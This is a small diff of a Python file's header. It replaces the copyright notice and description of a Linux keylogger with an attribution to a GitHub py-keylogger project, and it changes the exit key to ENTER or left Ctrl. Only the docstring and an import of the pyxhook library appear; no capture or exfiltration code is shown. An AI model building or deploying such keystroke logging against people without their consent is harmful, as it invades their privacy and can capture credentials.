@@ -1,14 +1,7 @@
 """
-Copyright (c) 2015, Aman Deep
-All rights reserved.
+Taken from https://github.com/hiamandeep/py-keylogger
 
-
-A simple keylogger witten in python for linux platform
-All keystrokes are recorded in a log file.
-
-The program terminates when grave key(`) is pressed
-
-grave key is found below Esc key
+The program terminates when ENTER or L_CTRL is pressed
 """
 
 import pyxhook
